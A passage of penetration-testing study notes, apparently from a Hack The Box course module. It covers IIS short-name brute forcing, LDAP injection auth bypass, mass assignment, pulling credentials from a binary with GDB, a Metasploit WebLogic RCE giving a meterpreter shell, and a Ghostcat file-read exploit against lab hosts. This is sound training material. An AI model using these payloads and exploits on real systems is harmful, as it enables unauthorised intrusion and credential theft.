Because you now know the file *must* start with the letters **"transf"**, you don't have to guess millions of random words. You can create a small, custom wordlist containing only words that start with "transf" (like *transfer, transform, transaction*) and use a tool like **Gobuster** to blast through them until the website responds with a 200 OK on the real file: transfer_data_backup_2026.aspx.

Thats why we cut the wordlists to only search for a name start with `transf`

```bash
 $ egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
grep: /usr/share/wordlists/sqlmap.txt: No such file or directory
                                                                                                   
┌──(kali㉿kali)-[~/Documents/HTB/Attacking-common-app]
└─$ head /tmp/list.txt 
transfer
transfers
transfert
transform
transfer2
transfer1
transfer
transfers
transfers

```

Start brute forcing the short file name

```bash
$ gobuster dir -w /tmp/list.txt -u http://10.129.4.215/ -x .aspx, .asp
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.4.215/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/transfer.aspx        (Status: 200) [Size: 941]

```

## **LDAP**

### 1. What is LDAP?

**LDAP (Lightweight Directory Access Protocol)** is an open, platform-independent protocol running over TCP/IP used to access and manage hierarchical data stores called directory services. These stores contain information about network assets such as users, groups, devices, and passwords. Key Benefits

- **Performance:** Fast queries due to its lean query language and non-normalized data storage.
- **Centralization:** Offers a single point of authentication (Single Sign-On capability) across heterogeneous operating systems.
- **Flexibility:** Features an extensible database blueprint (schema) that allows for custom attributes.

**Significant Limitations**

- **Security Deficit:** LDAP traffic is unencrypted by default. Secure implementations require explicitly configuring **LDAPS** (LDAP over SSL) or **StartTLS**.
- **Operational Friction:** It can be complex for administrators to configure securely, and components must be strictly LDAP-compliant.

### 2. LDAP vs. Active Directory (AD)

While often confused, they serve distinct roles in enterprise networks:

| **Feature** | **LDAP** | **Active Directory (AD)** |
| --- | --- | --- |
| **Type** | A communication **protocol**. | A complete directory **service/server**. |
| **Ecosystem** | Open-source and cross-platform (e.g., OpenLDAP). | Proprietary Microsoft software. |
| **Authentication** | Simple bind, SASL, etc. | Primarily uses **Kerberos** and NTLM. |
| **Dependencies** | None natively. | Requires Windows infrastructure like **DNS** and Kerberos. |

### 3. Communication Architecture & Queries

LDAP utilizes a client-server structure. Messages are encoded in ASN.1 format and exchanged over standard network ports: **Port 389** (Cleartext/StartTLS) or **Port 636** (LDAPS).

**The Lifecycle of a Request**

1. **Session Connection:** Client connects to the designated server port.
2. **Bind (Authentication):** Client authenticates using a Unique Identifier/Distinguished Name (DN) and password.
3. **Operation Request:** Client specifies an operation type (search, add, modify, delete) and parameters (Base DN, search filters, scopes).
4. **Server Response:** Server processes the logic, returns response data, a status result code (e.g., `result: 0 Success`), and closes the transaction.

### Example Query (`ldapsearch`)

The native utility `ldapsearch` demonstrates how information is requested 

```bash
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

Standard databases use flat tables (like an Excel spreadsheet). LDAP is different—it uses a **hierarchical tree structure**, which mirrors how a company is organized.

Because it’s a tree, every single object (a user, a computer, or a printer) has a unique "path" to it, called a **DN (Distinguished Name)**.

Here is a real visual of what an LDAP tree structure looks like:

```bash
          [ dc=company, dc=com ]  <-- The Root Domain
                    |
         +----------+----------+
         |                     |
   [ ou=People ]          [ ou=Devices ]  <-- Organizational Units (OUs)
         |                     |
   [ uid=jdoe ]           [ cn=printer01 ] <-- Actual Objects (Leaf Nodes)
```

- **`uid` (User ID) or `cn` (Common Name):** The specific individual or thing (e.g., `uid=jdoe`).
- **`ou` (Organizational Unit):** The folder or department it lives in (e.g., `ou=People` or `ou=Engineering`).
- **`dc` (Domain Component):** The parts of the company's domain name broken up (e.g., `company.com` becomes `dc=company, dc=com`).

So, if a system wants to look up John Doe, it asks LDAP for his full path:

```bash
uid=jdoe, ou=People, dc=company, dc=com
```

### 4. LDAP Injection Attacks

LDAP Injection occurs when user-supplied input is directly concatenated into an internal LDAP query string without sanitization. This allows attackers to manipulate backend query logic.

**Crucial Special Characters**

- (Wildcard): Matches any character set.
- `&` (Logical AND) / `|` (Logical OR).
- `()` (Expression Grouping).

**Authentication Bypass Scenario**

Consider a standard backend query used to verify logins:

```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

If the web application fails to filter the wildcard character, an attacker can input `*` into the username or password field:

- **Resulting Query:** `(&(objectClass=user)(sAMAccountName=*)(userPassword=dummy))`
- **The Outcome:** The query evaluates to **true** for the first record matching the logic, entirely bypassing valid credential checks and granting unauthorized entry.

### Mitigation

Organizations must comprehensively validate and sanitize all user inputs, strip LDAP-specific operators (`*`, `(`, `)`, `&`, `|`), and employ safe, parameterized query structures.

## Web Mass Assignment

https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html

**ass Assignment** (also known as **Auto-binding** or **Object Injection**) is a vulnerability that occurs when a web framework blindly binds a user's entire HTTP request directly to a backend data model or object database without filtering out unauthorized properties.

Modern web frameworks (like Ruby on Rails, Spring, Django, Laravel, or Node.js/Express) allow developers to write clean, lazy code. Instead of manually mapping every single property from a form into a database object like this:

```jsx
user.username = request.body.username;
user.email = request.body.email;
```

They use a single built-in shortcut that swallows the entire request body at once:

```jsx
// Vulnerable shorthand
user.update(request.body);
```

The issue arises when an internal data model contains attributes that a normal user shouldn't change (e.g., `role`, `isAdmin`, `is_premium`, `account_balance`). If the application blindly maps `request.body` to the model, an attacker can simply inject those restricted parameters into their payload.

### How Attackers Uncover Hidden Parameters

Since hidden properties aren't visible on the standard UI form, finding them is the core challenge for an pentester or attacker. They typically leverage a few key techniques:

**1. API Inspection & Reflection (Looking for Asymmetry)**

Many APIs exhibit asymmetric behavior where a **GET** request returns *more* properties than a **POST/PUT** request expects.

- If an attacker fetches their profile via `GET /api/v1/profile` and the JSON response contains:JSON
    
    ```json
    { "id": 102, "name": "Alice", "role": "user", "verified": false }
    ```
    

But the actual editing form on the frontend only prompts for `name`, the attacker instantly learns about the existence of the hidden `role` and `verified` parameters. They can then issue a malicious `PATCH` or `PUT` request adding `"role": "admin"`.

**2. Parameter Fuzzing & Wordlists**

If the API does not return hidden fields in standard responses, attackers use automated brute-forcing tools to spray common high-value parameter names into an HTTP request.

- **Tools Used:** Burp Suite Param Miner (guesses up to 65,000+ parameters per request), Arjun, or x8.
- **Methodology:** They test lists of words like `admin`, `role`, `privileges`, `status`, `tier`, `is_validated`, `points`, or `balance`. If the server returns a slightly different response size, a different status code (`200 OK` vs `400 Bad Request`), or echoes back the change, the property exists.

**3. JavaScript Source Code Mining**

Frontend applications pack hefty JavaScript bundles. Attackers comb through these client-side scripts looking for variables, API route definitions, or structured data schemas that reference internal object keys that are otherwise hidden from regular application views.

**4. Open-Source Intelligence (OSINT) & Framework Defaults**

If an organization uses open-source software or popular commercial platforms, attackers will read the public source code repository on GitHub or official documentation to map out the exact data structures of the underlying database models.

### **Example:**

we have a webite that is vulnerable to mass assignment, in the registrationn process we have two parameters to POST:

```bash
username=test&password=test&remember=on
```

After registering and login, we got this message:

```bash
Account is pending for approval
```

**After viewing the source code of the webiste, we learned:** In the reqistration process, there is another condition other than the username and password which is the `active` parameter. 

```python
def register():
        if request.method=='GET':
                return render_template('index.html')
        else:
                username=request.form['username']
                password=request.form['password']
                try:
                        if request.form['active']:
                                cond=True
                except:
                                cond=False
                with sqlite3.connect("database.db") as con:
                        cur = con.cursor()
                        cur.execute('select * from users where username=?',(username,))
                        if cur.fetchone():
                                return render_template('index.html',value='User exists!!')
                        else:
                                cur.execute('insert into users values(?,?,?)',(username,password,cond))
                                con.commit()
                                return render_template('index.html',value='Success!!')
```

After registering, the login function will check the three parameter, if the username and password exist but the `active` parameter was set to false (false by default), then it will return “`Account is pending for approval`” else, if the active set to true (meaning it was specified in the registration process), it will redirect us to home page

```python
def login():
        if request.method=='GET':
                return render_template('login.html')
        else:
                username=request.form['username']
                password=request.form['password']
                with sqlite3.connect("database.db") as con:
                        cur = con.cursor()
                        for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
                                if k:
                                        session['user']=i
                                        return redirect("/home",code=302)
                                else:
                                        return render_template('login.html',value='Account is pending for approval')
                return render_template('login.html',value='Invalid Credentials!!')

```

With that, add the active parameter in the registration form to bypass the admin approval

```bash
username=test1&password=test&active=test
```

## **Attacking Applications Connecting to Services**

Applications connected to external services often contain poorly protected connection strings. Penetration testers can examine these application binaries to extract credentials, allowing them to move laterally, escalate privileges, or test for credential reuse across the network.

### 1. ELF Executable Examination (Linux)

- **The Target:** A Linux binary named `octopus_checker` that verifies database availability.
- **The Issue:** The binary attempts to connect to an MS SQL database using a hidden connection string.
- **The Process:** * Because the connection string components are out of order and affected by reversed endianness in the source code, standard assembly disassembly (`disas main`) is difficult to read.
    - Testers use **GDB** with the **PEDA** extension to set a breakpoint at the specific function call responsible for the connection (`SQLDriverConnect`)

```bash
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000001456 <+0>:     endbr64 
   0x000000000000145a <+4>:     push   rbp
   0x000000000000145b <+5>:     mov    rbp,rsp
   0x000000000000145e <+8>:     push   rbx
   0x000...
   0x000000...
   0x00000000000015f0 <+410>:   push   rcx
   0x00000000000015f1 <+411>:   mov    r9d,0x400
   0x00000000000015f7 <+417>:   mov    r8,rsi
   0x00000000000015fa <+420>:   mov    ecx,0xfffffffd
   0x00000000000015ff <+425>:   mov    esi,0x0
   0x0000000000001604 <+430>:   mov    rdi,rax
   0x0000000000001607 <+433>:   call   0x11b0 <SQLDriverConnect@plt>
   0x000000000000160c <+438>:   add    rsp,0x10
   0x0000000000001610 <+442>:   mov    WORD PTR [rbp-0x4b4],ax
   0x0000000000001617 <+449>:   lea    rsi,[rip+0xa70]        # 0x208e
   0x000000000000161e <+456>:   lea    rdi,[rip+0x2a1b]        # 0x4040 <_ZSt4cout@@GLIBCXX_3.4>
   0x0000000000001625 <+463>:   call   0x11a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>                                                                                           
   0x000000000000162a <+468>:   mov    rdx,rax
   ...
   
```

Using `start` instead of `run` runs the binary and auto-pauses at the very first instruction of `main`. Crucially, this forces the system to load the binary into memory, which establishes the actual base address 

```bash
gdb-peda$ start
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[----------------------------------registers-----------------------------------]
RAX: 0x555555555456 (<main>:    endbr64)
RBX: 0x5555555557d0 (<__libc_csu_init>: endbr64)
RCX: 0x100 
RDX: 0x7fffffffe4b8 --> 0x7fffffffe71c ("SHELL=/bin/bash")
RSI: 0x7fffffffe4a8 --> 0x7fffffffe6fa ("/home/htb-student/octopus_checker")
RDI: 0x1 
RBP: 0x0 
RSP: 0x7fffffffe3b8 --> 0x7ffff7984083 (<__libc_start_main+243>:        mov    edi,eax)
RIP: 0x555555555456 (<main>:    endbr64)
R8 : 0x0 
R9 : 0x7ffff7d3fec0 --> 0x7ffff7d3f008 --> 0x7ffff7c15c90 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:       endbr64)
R10: 0x7ffff7bc31d5 ("_ZSt9use_facetISt7num_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEEERKT_RKSt6locale")
R11: 0x7ffff7cb6940 (<_ZSt9use_facetISt7num_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEEERKT_RKSt6locale>:   endbr64)
R12: 0x555555555240 (<_start>:  endbr64)
R13: 0x7fffffffe4a0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55555555544f <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs+294>: call   0x5555555551e0 <__stack_chk_fail@plt>                                                        
   0x555555555454 <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs+299>: leave  
   0x555555555455 <_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs+300>: ret                                                                                                 
=> 0x555555555456 <main>:       endbr64 
   0x55555555545a <main+4>:     push   rbp
   0x55555555545b <main+5>:     mov    rbp,rsp
   0x55555555545e <main+8>:     push   rbx
   0x55555555545f <main+9>:     sub    rsp,0x4b8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3b8 --> 0x7ffff7984083 (<__libc_start_main+243>:       mov    edi,eax)
0008| 0x7fffffffe3c0 --> 0x7ffff7b4cb80 --> 0x0 
0016| 0x7fffffffe3c8 --> 0x7fffffffe4a8 --> 0x7fffffffe6fa ("/home/htb-student/octopus_checker")
0024| 0x7fffffffe3d0 --> 0x100011c00 
0032| 0x7fffffffe3d8 --> 0x555555555456 (<main>:        endbr64)
0040| 0x7fffffffe3e0 --> 0x5555555557d0 (<__libc_csu_init>:     endbr64)
0048| 0x7fffffffe3e8 --> 0x54ad6e01d42c93aa 
0056| 0x7fffffffe3f0 --> 0x555555555240 (<_start>:      endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x0000555555555456 in main ()

```

the Instruction Pointer (`RIP`) is currently sitting at `0x555555555456`. This means the operating system loaded the binary with a base address of `0x555555554000`. The original offset was `0x1607`. So the current base address (`0x555555554000` + `0x1607`), it equals `0x555555555607`.

```bash
gdb-peda$ b *0x555555555607
```

or simply use `breakoffset` command and it will calculate the address   `0x1607`

```bash
gdb-peda$ breakoffset 0x1607
```

Running the program up to that breakpoint reveals the complete, plaintext connection string (including the server, username, and password) residing directly in the `RDX` register.

```bash
gdb-peda$ b *0x555555555607
Breakpoint 2 at 0x555555555607
gdb-peda$ run
Starting program: /home/htb-student/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x5555555557d0 (<__libc_csu_init>: endbr64)
RCX: 0xfffffffd 
RDX: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBP: 0x7fffffffe3b0 --> 0x0 
RSP: 0x7fffffffdee0 --> 0x7fffffffdefa --> 0xb3b000007ffff7fe 
RIP: 0x555555555607 (<main+433>:        call   0x5555555551b0 <SQLDriverConnect@plt>)
R8 : 0x7fffffffdf90 --> 0x0 
R9 : 0x400 
R10: 0xfffffffffffff8ff 
R11: 0x246 
R12: 0x555555555240 (<_start>:  endbr64)
R13: 0x7fffffffe4a0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555555fa <main+420>:   mov    ecx,0xfffffffd
   0x5555555555ff <main+425>:   mov    esi,0x0
   0x555555555604 <main+430>:   mov    rdi,rax
=> 0x555555555607 <main+433>:   call   0x5555555551b0 <SQLDriverConnect@plt>
   0x55555555560c <main+438>:   add    rsp,0x10
   0x555555555610 <main+442>:   mov    WORD PTR [rbp-0x4b4],ax
   0x555555555617 <main+449>:   lea    rsi,[rip+0xa70]        # 0x55555555608e
   0x55555555561e <main+456>:
    lea    rdi,[rip+0x2a1b]        # 0x555555558040 <_ZSt4cout@@GLIBCXX_3.4>
Guessed arguments:
arg[0]: 0x55555556c4f0 --> 0x4b5a ('ZK')
arg[1]: 0x0 
arg[2]: 0x7fffffffdf30 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
arg[3]: 0xfffffffd 
arg[4]: 0x7fffffffdf90 --> 0x0 
arg[5]: 0x400 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdee0 --> 0x7fffffffdefa --> 0xb3b000007ffff7fe 
0008| 0x7fffffffdee8 --> 0x0 
0016| 0x7fffffffdef0 --> 0x7fffffffe2b0 --> 0x7ffff7d4cf74 --> 0x2 
0024| 0x7fffffffdef8 --> 0x7ffff7fe7c3e (<_dl_runtime_resolve_xsavec+126>:      mov    r11,rax)
0032| 0x7fffffffdf00 --> 0x55555556b3b0 --> 0x4b59 ('YK')
0040| 0x7fffffffdf08 --> 0x55555556c4f0 --> 0x4b5a ('ZK')
0048| 0x7fffffffdf10 --> 0x7ffff7d4c000 --> 0x7ffff7d46280 --> 0x7ffff7cb2cb0 (<_ZNSt7num_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEED2Ev>: endbr64)
0056| 0x7fffffffdf18 --> 0x7fffffffe270 --> 0x7ffff7d4c000 --> 0x7ffff7d46280 --> 0x7ffff7cb2cb0 (<_ZNSt7num_getIwSt19istreambuf_iteratorIwSt11char_traitsIwEEED2Ev>:      endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x0000555555555607 in main ()

g

```

## **Other Notable Applications**

### **Enterprise Application Attack Surfaces**

- **Axis2**
    - **Context:** Often sits on top of Tomcat installations.
    - **Exploitation:** If Tomcat RCE fails, check for default admin credentials. Attackers can upload a webshell via an **AAR file** (Axis2 service file). A Metasploit module is available for this.
- **Websphere**
    - **Exploitation:** Check for default administrative credentials (e.g., `system:manager`). If accessed, attackers can deploy a **WAR file** to gain RCE via a web/reverse shell.
- **Elasticsearch**
    - **Context:** Older, forgotten installations are still occasionally found in large enterprise environments. Featured in the HTB machine *Haystack*.
- **Zabbix & Nagios (Monitoring Solutions)**
    - **Zabbix:** Prone to SQLi, auth bypass, stored XSS, and RCE. Built-in features can be abused for RCE via the Zabbix API (featured in HTB *Zipper*).
    - **Nagios:** Vulnerable to RCE, root priv-esc, SQLi, and code injection. Key check: default credentials (`nagiosadmin:PASSW0RD`) and version fingerprinting.
- **WebLogic**
    - **Context:** A Java EE application server with numerous CVEs (190+).
    - **Exploitation:** Highly susceptible to unauthenticated RCE exploits, historically driven by **Java Deserialization vulnerabilities**.
- **Wikis/Intranets (MediaWiki, SharePoint, etc.)**
    - **Exploitation:** Aside from software vulnerabilities, their **search functionalities** and document repositories frequently leak valid user credentials.
- **DotNetNuke (DNN)**
    - **Context:** A C#/.NET open-source CMS.
    - **Exploitation:** Prone to severe flaws including auth bypass, directory traversal, file upload bypass, and arbitrary file downloads.
- **vCenter**
    - **Context:** Used to manage ESXi in large organizations; often runs with high privileges (SYSTEM or Domain Admin).
    - **Exploitation:** Vulnerable to critical bugs like Apache Struts 2 RCE and unauthenticated file uploads (e.g., CVE-2021-22005). If a foothold is gained on a Windows-based vCenter appliance, local privilege escalation is often easily achieved using tools like **JuicyPotato**.

### Challenge

```bash
$ nmap 10.129.201.102 -sV -sC                          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 13:03 +03
Nmap scan report for 10.129.201.102
Host is up (0.16s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-07-20  04:51PM       <DIR>          aspnet_client
| 09-07-20  04:49PM                99710 iisstart.png
|_09-07-20  07:13PM                  218 web.config
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.102 - /
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=MS01
| Not valid before: 2020-09-06T23:51:02
|_Not valid after:  2021-03-08T23:51:02
|_ssl-date: 2026-05-26T10:04:32+00:00; 0s from scanner time.
|_http-title: 10.129.201.102 - /
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7001/tcp open  http          Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.42 seconds
                                                          
```

The application in use is `WebLogic` (WebLogic version: 12.2.1.3)). Oracle WebLogic Server 12.2.1.3 it suffers from numerous critical, one of them is  [Remote Code Execution (RCE) flaw.](https://nvd.nist.gov/vuln/detail/cve-2023-21842) There is a module in metasploitable that we can use for the exploitation 

```bash
msf6 > search weblogic
   13  exploit/multi/http/weblogic_admin_handle_rce 
   
                                      2020-10-20       excellent  Yes    Oracle WebLogic Server Administration Console Handle RCE
msf6 > use exploit/multi/http/weblogic_admin_handle_rce
[*] Using configured payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/http/weblogic_admin_handle_rce) >show options 

Module options (exploit/multi/http/weblogic_admin_handle_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...
                                         ]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/us
                                         ing-metasploit/basics/using-metasploit.html
   RPORT      7001             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly gener
                                         ated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_ht:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must b
                                       e an address on the local machine or 0.0.0.0 to listen on all
                                        addresses.
   SRVPORT  8080             yes       The local port to listen on.

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   4   PowerShell Stager

```

set the required options and run the exploit

```bash
meterpreter > sysinfo
Computer        : APP05
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 

```

## Application-Specific Hardening Tips

Though the general concepts for application hardening apply to all applications that we discussed in this module and will encounter in the real world, we can take some more specific measures. Here are a few:

| Application | Hardening Category | Discussion |
| --- | --- | --- |
| [WordPress](https://wordpress.org/support/article/hardening-wordpress/) | Security monitoring | Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more |
| [Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup) | Access controls | A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.inlanefreight.local/administrator?thisismysecretkey` |
| [Drupal](https://www.drupal.org/docs/security-in-drupal) | Access controls | Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login) |
| [Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html) | Access controls | Limit
 access to the Tomcat Manager and Host-Manager applications to only 
localhost. If these must be exposed externally, enforce IP whitelisting 
and set a very strong password and non-standard username. |
| [Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/) | Access controls | Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth) |
| [Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards) | Regular updates | Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication |
| [PRTG Network Monitor](https://helpdesk.paessler.com/en/support/solutions/articles/76000062446-what-security-features-does-prtg-include-) | Secure authentication | Make sure to stay up-to-date and change the default PRTG password |
| osTicket | Access controls | Limit access from the internet if possible |
| [GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/) | Secure authentication | Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains |

# **Attacking Common Applications - Skills Assessment I**

```bash
$ nmap 10.129.13.47 -sV -sC     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 23:03 +03
Nmap scan report for 10.129.13.47
Host is up (0.38s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_09-01-21  08:07AM       <DIR>          website_backup
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Freight Logistics, Inc
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-26T21:02:51+00:00; +57m41s from scanner time.
| ssl-cert: Subject: commonName=APPS-SKILLS1
| Not valid before: 2026-05-25T21:00:44
|_Not valid after:  2026-11-24T21:00:44
| rdp-ntlm-info: 
|   Target_Name: APPS-SKILLS1
|   NetBIOS_Domain_Name: APPS-SKILLS1
|   NetBIOS_Computer_Name: APPS-SKILLS1
|   DNS_Domain_Name: APPS-SKILLS1
|   DNS_Computer_Name: APPS-SKILLS1
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-26T21:02:41+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Jetty 9.4.42.v20210604
|_http-server-header: Jetty(9.4.42.v20210604)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.0.M1
|_http-server-header: Apache-Coyote/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-26T21:02:43
|_  start_date: N/A
|_clock-skew: mean: 57m41s, deviation: 0s, median: 57m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.99 seconds
                                                          
```

The application running tomcat version **9.0.0.M1** 

![Screenshot_2026-05-26_23_14_58.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-26_23_14_58.png)

for more info about the vulnerability, read this [blog](https://medium.com/@lhuang33/cve-2017-12617-tomcat-file-upload-rce-vulnerability-83983493d767)

### Jenkins

on the port 8000 Jenkins is running

![Screenshot_2026-05-27_18_33_13.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/Screenshot_2026-05-27_18_33_13.png)

### **Major Critical Vulnerabilities in Version 9.0.0.M1**

Because this version spans a decade of unpatched code, it is vulnerable to some of the most critical bugs found in Apache Tomcat history. Key examples include:

**Ghostcat (CVE-2020-1938)**

- **Type:** Arbitrary File Read / Inclusion
- **The Flaw:** By default in older versions, Tomcat leaves the Apache JNDI Protocol (AJP) connector enabled on port 8009.
- **Impact:** If the AJP port is exposed to the internet, an attacker can read any configuration file or source code inside the web application (including database passwords). If the application allows file uploads, this can be chained into an RCE.

**Path Equivalence RCE (CVE-2025-24813)**

- **Type:** Remote Code Execution (RCE) / Path Equivalence
- **The Flaw:** A flaw in how Tomcat handles partial `PUT` requests using an internal dot-naming convention.
- **Impact:** If the application is configured with file-based session persistence and has specific write permissions enabled, an attacker could upload a serialized Java payload via a partial `PUT` request to trigger remote code execution.

**HTTP Request Smuggling (Multiple CVEs)**

- **Type:** Protocol Manipulation
- **The Flaw:** Early 9.x versions incorrectly parse the `Transfer-Encoding` or HTTP trailer headers when deployed behind a reverse proxy (like Nginx or an AWS ALB).
- **Impact:** Attackers can "smuggle" requests inside a legitimate user's connection, leading to credential hijacking, cache poisoning, or bypassing security constraints.

### Exploiting gohstcat

[source](https://github.com/Debojit2003/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.py)

```bash
$ python3 ghostcat.py 10.129.14.182 -p 8009 -f WEB-INF/web.xml              
Getting resource at ajp13://10.129.14.182:8009/asdf
----------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
